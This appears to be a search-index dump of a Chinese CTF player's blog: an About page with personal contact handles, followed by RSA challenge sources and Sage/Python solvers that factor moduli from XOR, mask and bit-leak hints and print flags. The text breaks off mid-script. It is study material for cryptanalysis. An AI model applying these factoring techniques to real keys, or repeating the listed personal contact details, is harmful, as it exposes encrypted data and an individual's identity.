[{"content":"\rabout # 我事谁？ # id：ljahum\r@Syclover\n目前在蜀南信专当鼠鼠🐀\nqq：1695325350\nG-mail：roomoflja@gmail.com\ngithub|\r留言板\ndiscord : ljahum#7113\nsteam: 149018740\nSometimes I have fun here\n网安菜鸡，希望在遥远的将来不会被饿死\n想搞好玩的东西，想恰到饭，想实现梦想 无奈能力不够智商低下习惯邋遢\n只能当个咸鱼混吃等死\n憨批lu和他的朋友们 # 随缘排序\n敏娜桑 # 浪超人 阿祖祖 wlz 羽鸽鸽 leohreats 芋头 cr0ss×2 muhe 金太君 jly zoniony const27 翰总 泪笑 雷总 王过年 姥爷 马爷爷 晋爷爷 燕乘风 锅老师 潘👴 博哥 肖师傅 学弟/妹 # 熊猫操作系统 吊人zwh 孙老板 闻铃 御史神风 Myu 大蛇 外校👴 # N0vice x1c team # ❤肥猫嘤嘤 To1in 如果你喜欢嘉然,哪我们就是异父异母的好兄弟\n","date":"20 February 2021","permalink":"/achieve/about/","section":"archive","summary":"","title":"About"},{"content":"\r迁移 # https://slash-clavicle-dbb.notion.site/Shared-073326638a86449c9a06d6467fed470f\n","date":"11 February 2023","permalink":"/achieve/to_noiton/","section":"archive","summary":"","title":"迁移"},{"content":"\rdisplay cabinet. # ","date":"4 November 2023","permalink":"/","section":"","summary":"display cabinet.","title":""},{"content":"","date":"4 November 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"4 November 2023","permalink":"/tags/crypto/","section":"Tags","summary":"","title":"crypto"},{"content":"","date":"4 November 2023","permalink":"/tags/math/","section":"Tags","summary":"","title":"math"},{"content":"","date":"4 November 2023","permalink":"/categories/posts/","section":"Categories","summary":"","title":"posts"},{"content":"This section contains all my current projects.\n","date":"4 November 2023","permalink":"/articles/","section":"Projects","summary":"This section contains all my current projects.","title":"Projects"},{"content":"\rrsa all in two # leak (p^q)\u0026raquo;nbits # from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) nbits=512 leakBits = 262 leakbits = nbits - leakBits e = 65537 n=73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923 c=71808322808599218331233291542779486534747913572475630198802984648982830332628443972652322590637382696027943799004331488098592525306523343649935216419522329722152742610560398216737030893090641493326477786720839849938277402743820773957184083430369443325368720115515840174745825798187125454448297155036065857691 leak=2223117424030234543005449667053988296724455736030907136592525175314696509716321 leak = leak \u0026lt;\u0026lt; leakbits a1 = \u0026#34;0\u0026#34; + str(bin(leak)[2:]) def find(p,q): l = len(p) tmp0 = p + (512-l)*\u0026#34;0\u0026#34; tmp1 = p + (512-l)*\u0026#34;1\u0026#34; tmq0 = q + (512-l)*\u0026#34;0\u0026#34; tmq1 = q + (512-l)*\u0026#34;1\u0026#34; if(int(tmp0,2) \u0026lt; int(tmq0,2)): return if(int(tmp0,2)*int(tmq0,2) \u0026gt; n): return elif(int(tmp1,2)*int(tmq1,2) \u0026lt; n): return if(l == 512 - leakbits): pp = int(tmp0,2) PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = pp + x*2 + 1 f = f.monic() res = f.small_roots(X=2^leakbits-1, beta=0.5, epsilon=0.01) if(res): try: plow = int(res[0]) p = pp + plow * 2 + 1 q = n // p d = inverse(e,(p-1)*(q-1)) print(long_to_bytes(int(pow(c,d,n)))) except: pass else: if(a1[l] == \u0026#34;1\u0026#34;): find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) else: find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) tempp = \u0026#34;\u0026#34; tempq = \u0026#34;\u0026#34; find(tempp,tempq) #flag{6eb67115-38b1-4e75-b3fc-de3a9697e565} 比较 aii in one 的一集 # import sympy from Crypto.Util.number import * from secret import flag e = 65537 p1 = sympy.randprime(2 ** 1023,2 ** 1024) q1 = sympy.randprime(2 ** 1023,2 ** 1024) a1 = p1 ^ q1 b1 = p1 * q1 c1 = pow(bytes_to_long(flag[:19]),e,p1*q1) p2 = sympy.randprime(2 ** 511, 2 ** 512) q2 = sympy.randprime(2 ** 511, 2 ** 512) a2 = (p2 * q2) ^ (p2 + q2) b2 = (p2 * q2) ^ (p2 - q2) c2 = pow(bytes_to_long(flag[19:]),e,p2*q2) f= open(\u0026#39;output.txt\u0026#39;,\u0026#39;w\u0026#39;) f.write(str(a1)+\u0026#39;\\n\u0026#39;) f.write(str(b1)+\u0026#39;\\n\u0026#39;) f.write(str(c1)+\u0026#39;\\n\u0026#39;) f.write(str(a2)+\u0026#39;\\n\u0026#39;) f.write(str(b2)+\u0026#39;\\n\u0026#39;) f.write(str(c2)+\u0026#39;\\n\u0026#39;) a1=67739512154277162085770157687437441198363095490607019903179640765859289435128844487312739643781929328039885340492248268381181927215444058044731882600621443249379470235583032722854561171610662253187419453432598163528304052508578209017561499836803166110456130462444164049945234353225230736363194196935115979960 b1=17185396829856546439605443867156437815015135756541052637907770783830686534153389303291740769607944691156059669175157827203495395745826694347428694508457493991041224390283763876476601200114028282946724348906485066220181559142937065978299071246507281834301352443856315199896106182934770582627129779923357891915723961923663378398066801894395956482176730300442901078199030200112352639266103862753546370851947797706641058966862813099369195689336228579744994641830699890792017097474275824545664085264972274642572927392940910981115837831275773192989084712813373293435228956787629490757407431010258942490818726318175944867633 c1=2180773316568266715369209198734610509148388893757598741330158376506447322216176787253641696053169188685408469718202047474660716095850135317790263924418449270019680259700945680062960717565507426032265137192689118286560945331123730529355709043463330231284484658907466172538703301303440062783852136344472063837313195697915205569416630439851250171277336484771753816776835527532090668694986220968152676688392975798850738947165707984817923309381811015047150056144403783079156300625762879231698942313672034730244627530962258121618021680413439757194393609777357848156392150372631861473658135778661768208071991812674187273360 a2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774940370836206596205967641213842702547665263659933022253549718321445029287279257463914991950587622466780705329578580061019164231870445205566240956950369224751 b2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774949520538413350277489291427420271328741830415622921056457371226207219443304838109001023043838810016379140438034881290332449739051404396455209891630254998985 c2=46285230821397377383998198689981002335902850753318921384068480704506522918467396194184971163720421808774010121239873784436865080818119851642074388303787396280596526597467664310187113430990219486840906481260493087443528880139543560763852844535689852804877233056126591516506599561944164619603448246607830867682 p*q、p^q 1 # import sympy from Crypto.Util.number import * from secret import flag e = 65537 p1 = sympy.randprime(2 ** 1023,2 ** 1024) q1 = sympy.randprime(2 ** 1023,2 ** 1024) a1 = p1 ^ q1 b1 = p1 * q1 # from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) #part1,剪枝 a1=67739512154277162085770157687437441198363095490607019903179640765859289435128844487312739643781929328039885340492248268381181927215444058044731882600621443249379470235583032722854561171610662253187419453432598163528304052508578209017561499836803166110456130462444164049945234353225230736363194196935115979960 b1=17185396829856546439605443867156437815015135756541052637907770783830686534153389303291740769607944691156059669175157827203495395745826694347428694508457493991041224390283763876476601200114028282946724348906485066220181559142937065978299071246507281834301352443856315199896106182934770582627129779923357891915723961923663378398066801894395956482176730300442901078199030200112352639266103862753546370851947797706641058966862813099369195689336228579744994641830699890792017097474275824545664085264972274642572927392940910981115837831275773192989084712813373293435228956787629490757407431010258942490818726318175944867633 c1=2180773316568266715369209198734610509148388893757598741330158376506447322216176787253641696053169188685408469718202047474660716095850135317790263924418449270019680259700945680062960717565507426032265137192689118286560945331123730529355709043463330231284484658907466172538703301303440062783852136344472063837313195697915205569416630439851250171277336484771753816776835527532090668694986220968152676688392975798850738947165707984817923309381811015047150056144403783079156300625762879231698942313672034730244627530962258121618021680413439757194393609777357848156392150372631861473658135778661768208071991812674187273360 e = 65537 a1 = \u0026#34;0\u0026#34; + str(bin(a1)[2:]) def find(p,q): l = len(p) tmp0 = p + (1024-l)*\u0026#34;0\u0026#34; tmp1 = p + (1024-l)*\u0026#34;1\u0026#34; tmq0 = q + (1024-l)*\u0026#34;0\u0026#34; tmq1 = q + (1024-l)*\u0026#34;1\u0026#34; if(int(tmp0,2) \u0026lt; int(tmq0,2)): return if(int(tmp0,2)*int(tmq0,2) \u0026gt; b1): return elif(int(tmp1,2)*int(tmq1,2) \u0026lt; b1): return if(l == 1024): pp = int(tmp0,2) qq = int(tmq0,2) d = inverse(e,(pp-1)*(qq-1)) m = long_to_bytes(pow(c1,d,pp*qq)) print(str(m)[2:-1],end = \u0026#34;\u0026#34;) else: if(a1[l] == \u0026#34;1\u0026#34;): find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) else: find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) tempp = \u0026#34;\u0026#34; tempq = \u0026#34;\u0026#34; find(tempp,tempq) N ^ (p + q)、N ^ (p - q) # #part2 硬剪枝 a2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774940370836206596205967641213842702547665263659933022253549718321445029287279257463914991950587622466780705329578580061019164231870445205566240956950369224751 b2=102834527596695950719979111423985349726489864165244791755647652205679952999516919199218636781810880771255724153293007819995198831162629014290926266777774949520538413350277489291427420271328741830415622921056457371226207219443304838109001023043838810016379140438034881290332449739051404396455209891630254998985 c2=46285230821397377383998198689981002335902850753318921384068480704506522918467396194184971163720421808774010121239873784436865080818119851642074388303787396280596526597467664310187113430990219486840906481260493087443528880139543560763852844535689852804877233056126591516506599561944164619603448246607830867682 e = 65537 def find(p,q,k): mask = 2**k-1 t1 = (int(p,2)*int(q,2)) t2 = (int(p,2)+int(q,2)) t3 = (int(p,2)-int(q,2)) if(len(bin(int(p,2))[2:]) == 512 and len(bin(int(q,2))[2:]) == 512): pp = int(p,2) qq = int(q,2) d = inverse(e,(pp-1)*(qq-1)) m = long_to_bytes(pow(c2,d,pp*qq)) if(len(m) \u0026lt; 20): print(str(m)[2:-1]) exit() if(((t1^t2)\u0026amp;mask) == (a2\u0026amp;mask) and ((t1^t3)\u0026amp;mask) == (b2\u0026amp;mask)): find(\u0026#34;0\u0026#34;+p,\u0026#34;0\u0026#34;+q,k+1) find(\u0026#34;0\u0026#34;+p,\u0026#34;1\u0026#34;+q,k+1) find(\u0026#34;1\u0026#34;+p,\u0026#34;0\u0026#34;+q,k+1) find(\u0026#34;1\u0026#34;+p,\u0026#34;1\u0026#34;+q,k+1) else: return p = \u0026#34;1\u0026#34; q = \u0026#34;1\u0026#34; find(p,q,1) p*q、p ^ inv_q # _q = int(bin(q)[2:][::-1] , 2)\rc = pow(m,e,n)\rprint(p ^ _q) from Crypto.Util.number import * import sys sys.setrecursionlimit(1500) pxorq = 47761879279815109356923025519387920397647575481870870315845640832106405230526 n = 10310021142875344535823132048350287610122830618624222175188882916320750885684668357543070611134424902255744858233485983896082731376191044874283981089774677 c = 999963120986258459742830847940927620860107164857685447047839375819380831715400110131705491405902374029088041611909274341590559275004502111124764419485191 e = 65537 pxorq = str(bin(pxorq)[2:]).zfill(256) def find(ph,qh,pl,ql): l = len(ph) tmp0 = ph + (256-2*l)*\u0026#34;0\u0026#34; + pl tmp1 = ph + (256-2*l)*\u0026#34;1\u0026#34; + pl tmq0 = qh + (256-2*l)*\u0026#34;0\u0026#34; + ql tmq1 = qh + (256-2*l)*\u0026#34;1\u0026#34; + ql if(int(tmp0,2)*int(tmq0,2) \u0026gt; n): return if(int(tmp1,2)*int(tmq1,2) \u0026lt; n): return if(int(pl,2)*int(ql,2) % (2**(l-1)) != n % (2**(l-1))): return if(l == 128): pp0 = int(tmp0,2) if(n % pp0 == 0): pf = pp0 qf = n//pp0 phi = (pf-1)*(qf-1) d = inverse(e,phi) m1 = pow(c,d,n) print(long_to_bytes(m1)) exit() else: if(pxorq[l] == \u0026#34;1\u0026#34; and pxorq[255-l] == \u0026#34;1\u0026#34;): find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) elif(pxorq[l] == \u0026#34;1\u0026#34; and pxorq[255-l] == \u0026#34;0\u0026#34;): find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) elif(pxorq[l] == \u0026#34;0\u0026#34; and pxorq[255-l] == \u0026#34;1\u0026#34;): find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) elif(pxorq[l] == \u0026#34;0\u0026#34; and pxorq[255-l] == \u0026#34;0\u0026#34;): find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;0\u0026#34;,\u0026#34;0\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(ph+\u0026#34;0\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;0\u0026#34;+ql) find(ph+\u0026#34;1\u0026#34;,qh+\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;+pl,\u0026#34;1\u0026#34;+ql) find(\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;) other # 暑假做的一个小题 # leak1 = (p2+q2) \u0026gt;\u0026gt; 400 leak2 = (p1 \u0026amp; ((1 \u0026lt;\u0026lt; 350) - 1)) \u0026gt;\u0026gt; 5 题目的主要问题在于由leak1解出leak2。显然，如果我们有完整的p2+q2，我们就能够直接联立n2的方程得到精确的p2、q2的值。但是问题在于leak1的低四百位被隐藏了，因此我们没有办法直接解出精确的p2、q2。 而事实上，我们并不需要精确的p2、q2，我们只需要知道他们的高位，就可以通过p高位泄漏求出他们的精确值。因此我们可以通过下面方式解出p2、q2的近似值： #part1 get leak2 PR.\u0026lt;x\u0026gt; = PolynomialRing(RealField(1000)) f = x*((leak1\u0026lt;\u0026lt;400)-x) - n2 p2high = int(f.roots()[0][0]) smallroot解方程 # def getn(): while(1): p = getPrime(128) error = getPrime(40) q = 2*p + error r = 2*q + error if(isPrime(q) and isPrime(r)): n = p*q*r break return (p,n) 拿p解方程\n#step 1 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n1//p1)) f = (2*p1 + x)*(4*p1 + 3*x) f = f.monic() roots = f.small_roots(X=2^41,beta=0.4) if roots: error = int(roots[0]) 连分数 # num1 = 3 num2 = 5 while(num1\u0026lt;num2): num1 = getPrime(512) num2 = getPrime(512) num3 = ring(num1) / ring(num2) num3 = 1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956 c = continued_fraction(num3) print(c) alist = c.convergents() for i in alist: a = str(i).split(\u0026#39;/\u0026#39;) if len(a)\u0026gt;1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==512 and int(a[1]).bit_length()==512: num1 = int(a[0]) num2 = int(a[1]) 二项式 # myfunction(n)的结果是n^3，那这个方程就变成了hint2 = (3n+1)^p_low mod n^3，二项式定理展开，看系数能算出来p_low，然后coppersmith求出p就行了\nfrom Crypto.Util.number import * from Crypto.Util.strxor import strxor from random import randint from gmpy2 import invert import os flag = b\u0026#39;xxx\u0026#39; def mypad(m): l = len(m) r = 190 - l padded_m = m + os.urandom(r) return padded_m def myfunction(num): output = 0 j = 0 for i in range(num): output += (i+j)*6 + 1 j += i return output def mix(a,b): return a | b , a * b class MySeries(): def __init__(self, num): self.num = num def Coe(self, n): i = 0 c = 1 while i \u0026lt; n: i += 1 c = (c * (1 / 2 - i + 1)) / i return c def Point(self, center): sum = 0 center -= 1 i = 0 while i \u0026lt; self.num: sum += (center ** (1 / 2 - i) * self.Coe(i)) i += 1 return sum def All(bound): num = randint(1111, 2222) T = MySeries(num) output = 0 i = 3 while i \u0026lt; bound: b1 = T.Point(i) b2 = T.Point(i + 1) output += (b1 + b2) / 2 i += 1 return output if __name__ == \u0026#39;__main__\u0026#39;: flag_len = len(flag) p,q = getPrime(512),getPrime(512) while True: r = getPrime(512) R = bytes_to_long(str(r).encode()) if isPrime(R): break n = p * q * r hint1 = R * r mod = myfunction(n) hint2 = pow(3*n+1,p % (2 ** 400),mod) k = int(All(n)) xor_flag = strxor(long_to_bytes(k \u0026gt;\u0026gt; (k.bit_length() - 8 * flag_len)),flag) pad_flag = mypad(xor_flag) m = bytes_to_long(pad_flag) c = pow(m,65537,n) print(\u0026#39;All data:\u0026#39;) print(f\u0026#39;flag_len = {flag_len}\u0026#39;) print(f\u0026#39;n = {n}\u0026#39;) print(f\u0026#39;c = {c}\u0026#39;) print(f\u0026#39;hint1 = {hint1}\u0026#39;) print(f\u0026#39;hint2 = {hint2}\u0026#39;) \u0026#39;\u0026#39;\u0026#39; All data: flag_len = 42 n = 1885106209951408608833065466098355578239648885277085979696889428331716535742564778501798478665957825315340421821880653818505857049636611632357321104069926874970489073929053910350131880591544986024406953378391135673202854750625745159391997973535848495128365477217006260495413869532372418221652962946340513593002422433536479789576519469228846773250447077165756739529520975715667675188738514871033908115371290569902086064227476952606366538782284487477820835988316471 c = 696238728213276154324787695659767792043458798396732235983493075871691401810545168845655490352789752222363100922123671319198981013421632076090146254867823593523050502577701155837063376958530879006719716789887624440134559774538443909463537086796915613123528679984244371544503657821859556837415229166015914540860398289216765611441964228176020361651359395184571105468667815326494558761738459063914192172836518999575866452752941368767971539919141604299843463853501960 hint1 = 47533994701669017942592643580845693193316601935087923279407365999451221242084261195588230994183718077379066856479267476895986608547324057765879168010176037349172136581929046771540241367625486215731295814611283581608613208990206581757576978017732022062210538697720930605552259306749633658032304554578427461842934055558865521604512892691323385156889995854702621568441768712619224249280792783364635307739215957762771386413831279443875185633720270001928747743847856394847878232194076679733830705297410959656270945532930199517880949 hint2 = 1345739841248959791137389026125065605121513428784838684290299665636596562317989590469829195181078904857051392378877013458099983407103737518119999468489762053545474516182879516762580472262640794849609626308003164739287189671066241628052826558582865342176036139097546843281565147798609965645514151827840249686650855385385323417455247722134760335695053787221300451942370377598800841980049138341564555801417479362085565640973199260631136149016266661293883650801813550118778433333591258278147003619871962070136454674193198696690506092831171400435490432196636796719177624389194619648086397178720207413652618636521150924913978530986709499047969775311955879302418093270101476537853298615347062384026172441455857088955847766335746521291043747795520485020303040819568036819058385444936925860671650596681910380157657689041971132993731048618045570715513584627109356139903842365556697314631573799394266292587334468008221427502353566938518574247502783245674619641519095644135976062817840893465238031354234069073928763492529419021632732679912738674105898149050223970723297059883534089683179512881491210176114419520070007595698242827625902377045860953285447617249204919971737086366 \u0026#39;\u0026#39;\u0026#39; $$ hint2 = (3n+1)^{p\u0026rsquo;} mod n^3 $$\n$$ = kn^3+9(p\u0026rsquo;\\frac{(p\u0026rsquo;-1)}{2})n^2 + 3p\u0026rsquo;n + 1\n$$\nfrom Crypto.Util.number import * from Crypto.Util.strxor import strxor flag_len = 42 n = 1885106209951408608833065466098355578239648885277085979696889428331716535742564778501798478665957825315340421821880653818505857049636611632357321104069926874970489073929053910350131880591544986024406953378391135673202854750625745159391997973535848495128365477217006260495413869532372418221652962946340513593002422433536479789576519469228846773250447077165756739529520975715667675188738514871033908115371290569902086064227476952606366538782284487477820835988316471 c = 696238728213276154324787695659767792043458798396732235983493075871691401810545168845655490352789752222363100922123671319198981013421632076090146254867823593523050502577701155837063376958530879006719716789887624440134559774538443909463537086796915613123528679984244371544503657821859556837415229166015914540860398289216765611441964228176020361651359395184571105468667815326494558761738459063914192172836518999575866452752941368767971539919141604299843463853501960 hint1 = 47533994701669017942592643580845693193316601935087923279407365999451221242084261195588230994183718077379066856479267476895986608547324057765879168010176037349172136581929046771540241367625486215731295814611283581608613208990206581757576978017732022062210538697720930605552259306749633658032304554578427461842934055558865521604512892691323385156889995854702621568441768712619224249280792783364635307739215957762771386413831279443875185633720270001928747743847856394847878232194076679733830705297410959656270945532930199517880949 hint2 = 1345739841248959791137389026125065605121513428784838684290299665636596562317989590469829195181078904857051392378877013458099983407103737518119999468489762053545474516182879516762580472262640794849609626308003164739287189671066241628052826558582865342176036139097546843281565147798609965645514151827840249686650855385385323417455247722134760335695053787221300451942370377598800841980049138341564555801417479362085565640973199260631136149016266661293883650801813550118778433333591258278147003619871962070136454674193198696690506092831171400435490432196636796719177624389194619648086397178720207413652618636521150924913978530986709499047969775311955879302418093270101476537853298615347062384026172441455857088955847766335746521291043747795520485020303040819568036819058385444936925860671650596681910380157657689041971132993731048618045570715513584627109356139903842365556697314631573799394266292587334468008221427502353566938518574247502783245674619641519095644135976062817840893465238031354234069073928763492529419021632732679912738674105898149050223970723297059883534089683179512881491210176114419520070007595698242827625902377045860953285447617249204919971737086366 r = gcd(n, hint1) pq = n // r P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = 9*x*(x-1)*n^2 + 6*x*n + 2 - 2*hint2 p_low = f.roots()[0][0] P.\u0026lt;y\u0026gt; = PolynomialRing(Zmod(pq)) g = 2^400*y + p_low g = g.monic() res = g.small_roots(X=2^112, beta=0.4, epsilon=0.03) p = 2^400*int(res[0]) + p_low q = pq // p phi = (p-1) * (q-1) * (r-1) assert p*q*r == n d = inverse(65537, phi) m_pad = long_to_bytes(int(pow(c, d, n))) m_xor = m_pad[:42] # print(m_pad) integral = lambda x: int(floor(2/3*(x^(3/2) - 3^(3/2)))) k = integral(n) flag = strxor(long_to_bytes(k \u0026gt;\u0026gt; (k.bit_length() - 8 * flag_len)), m_xor) print(flag) 数论题 # hint2 = pow(2, 2023, Mod) # https://tangcuxiaojikuai.xyz/post/39588.html\nm = (m \u0026gt;\u0026gt; kbits) \u0026lt;\u0026lt; kbits Mod = getPrime(1024) hint1 = (2021-2023*m) % Mod hint2 = pow(2, 2023, Mod) print(\u0026#39;hint1 =\u0026#39;,hint1) print(\u0026#39;hint2 =\u0026#39;,hint2) $$ hint2-KM=2^{2023} \\ mod (M) $$\nhint1 = ... hint2 = ... e = 3 kM = 2**2023-hint2 PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(kM)) f = 2023*x + hint1 - 2021 f = f.monic() roots = f.small_roots(X=2^200,beta=0.4) if roots: mhigh = roots[0] p1 = inverse(p,q) # m 1 = bytes_to_long(flag1) p = getPrime(512) q = getPrime(512) n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) p1 = gmpy2.invert(p,q) q1 = gmpy2.invert(q,p) c = pow(m1,e,n) print(\u0026#34;p1=\u0026#34;,p1) print(\u0026#34;q1=\u0026#34;,q1) print(\u0026#34;c=\u0026#34;,c) print(\u0026#34;phi=\u0026#34;,phi) 带点爆破\nfrom Crypto.Util.number import * #1 def gcd(a, b): while(b): a,b = b, a % b return a def mysqrt(d): st = 1 en = 10**1300 while st\u0026lt;=en: mid = (st+en)//2 if mid*mid == d: return mid if mid*mid \u0026lt; d: st=mid+1 else: en=mid-1 return -1 def egcd(a1, a2): x1, x2 = 1, 0 y1, y2 = 0, 1 while a2: q = a1 // a2 a1, a2 = a2, a1 - q * a2 x1, x2 = x2, x1 - q * x2 y1, y2 = y2, y1 - q * y2 return (x1, y1, a1) flag = \u0026#34;\u0026#34; ipmq= ... iqmp= ... phi= ... e = 65537 enc = ... d = inverse(e,phi) gg = gcd(iqmp-1,ipmq-1) c = phi // gg a = (ipmq-1)//gg b = (iqmp-1)//gg # p*a + q*b = c pmod = inverse(a, b)*c%b for j in range(100000): p = pmod + j*b if p \u0026gt; (1\u0026lt;\u0026lt;1024): break if not isPrime(p): continue q = (c-p*a)//b assert(p*a+q*b==c) if (iqmp*q-1)%p == 0 and (ipmq*p-1)%q == 0: M = pow(enc,d,p*q) flag += str(long_to_bytes(M))[2:-1] break hint = pow(2023*p + 114514, q, n) # 二项式\nhint = pow(2023 * p + 114514, q, n)\n$$ hint =2023p+k\\ mod \\ q\\hint =114514^p\\ =114514^{pq}\\ mod \\ q\\ $$\n$$ hint=114514^n\\ +kp+tn \\mod \\ p\\hint-14514^n=kp+0\\ mod\\ n $$\ncnss 掩码剪枝收集 # 1\nprint(f\u0026#39;mask = {mask}\u0026#39;) print(p|mask) print(p\u0026amp;mask) from Crypto.Util.number import * c = 64949799997326584007544788513993497249594769744995858720976935000014197232306799968807213667255871030075230919683627404813038995304033226711042639925325815395252041199650244620814678407788637241064396318107929964286966081900052163098825412222835465966640369222321472659135622216530966800717417560715221275591 n = 106750680418525866311589462967145265327203310954735134383588573660691518247034803380198999333962213971657327515092895034635965957228036264848532931376595751503164297061094511187060069380048933807326213369464059701069965785612620370291933800122445966488267918733547599024267999872488061941892122230382138042783 mask = 12270330408774238331968219216635392599519489634111741706590917012819298856158311310855782884352875794146685141255943386189197362902992928716839082520848927 gift1 = 13112112110892990771168306272793201342028151601627796725313855804865001339738164412798270175076178951452110894792943424133718769511979832250960465757056799 gift2 = 11731832079629748669705816329667815638461774924918417348984676937048335348013101619038697983623814812736529127108466295988845879378764866277739393693264401 e = 65537 strmask = bin(mask)[2:] strgift1 = bin(gift1)[2:] strgift2 = bin(gift2)[2:] strp = [] for i in range(len(strmask)): if(strgift2[i] == \u0026#34;1\u0026#34;): strp.append(\u0026#34;1\u0026#34;) else: if(strgift1[i] == \u0026#34;1\u0026#34; and strmask[i] == \u0026#34;0\u0026#34;): strp.append(\u0026#34;1\u0026#34;) elif(strgift1[i] == \u0026#34;1\u0026#34; and strmask[i] == \u0026#34;1\u0026#34;): strp.append(\u0026#34;0\u0026#34;) else: strp.append(\u0026#34;0\u0026#34;) p = int(\u0026#34;\u0026#34;.join(strp),2) q= n//p phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) 2\nprint(f\u0026#39;mask1 = {mask1}\u0026#39;)\rprint(f\u0026#39;mask2 = {mask2}\u0026#39;)\rprint(f\u0026#39;h1 = {p\u0026amp;mask1}\u0026#39;)\rprint(f\u0026#39;h2 = {q\u0026amp;mask2}\u0026#39;) 思路\n\u0026amp;运算为1，则p该位必为1 \u0026amp;运算为0，mask该位为1，则p该位必为0 而当\u0026amp;运算为0，mask也为0时，p的该比特位就存在两种结果，无法完全确定。可是这题不仅给了p，还给了q的位运算结果，因此我们可以利用下面这一点信息，从高位向低位进行深度优先搜索，显著降低复杂度：\n1、将p、q当前确定的二进制位后方全部填充0，直至填满512位，此时p、q乘积应小于n。\n2、将p、q当前确定的二进制位后方全部填充1，直至填满512位，此时p、q乘积应大于n。\n偷代码\nh1[l] == \u0026#34;1\u0026#34;) and (mask2[l] == \u0026#34;0\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) elif((mask1[l] == \u0026#34;1\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;1\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) elif((mask1[l] == \u0026#34;1\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) elif((mask1[l] == \u0026#34;1\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;0\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) elif((mask1[l] == \u0026#34;0\u0026#34; and h1[l] == 